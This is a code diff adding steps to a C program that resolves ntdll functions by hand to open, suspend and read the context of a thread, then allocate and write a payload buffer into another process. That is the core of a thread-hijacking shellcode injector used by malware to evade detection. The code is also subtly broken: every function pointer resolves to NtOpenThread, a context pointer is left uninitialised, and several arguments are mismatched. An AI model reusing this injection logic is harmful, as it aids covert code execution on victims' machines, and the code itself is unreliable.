@@ -141,7 +141,9 @@ size_t GetFuncAddr(size_t modb, char* fn) {
 int main(int argc, char** argv, char* envp) {
 	size_t kb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
 	g(" GetModHandle(ntdll.dll) = % p\n", kb);
+	size_t mb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
 
+	size_t ptr_CreateToolhelp32Snapshot = (size_t)GetFuncAddr(mb, L"CreateToolhelp32Snapshot");
 	size_t ptr_NtOpenThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
 	size_t ptr_NtSuspendThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
 	size_t ptr_NtGetContextThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
@@ -158,12 +160,17 @@ int main(int argc, char** argv, char* envp) {
 	OBJECT_ATTRIBUTES oa;
 	PVOID baseAddress = NULL;
 	ULONG n;
-
-
+	PCONTEXT CTX;
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG))ptr_NtOpenThread)(hThread, THREAD_ALL_ACCESS, &oa ,0);
+
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtSuspendThread)(hThread, &n);
+
+
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtGetContextThread)(hThread, CTX);
+
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hProc, &baseAddress, n,n,n);
+
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hProc, &baseAddress, &buf, sizeof(buf), &n);
 
 
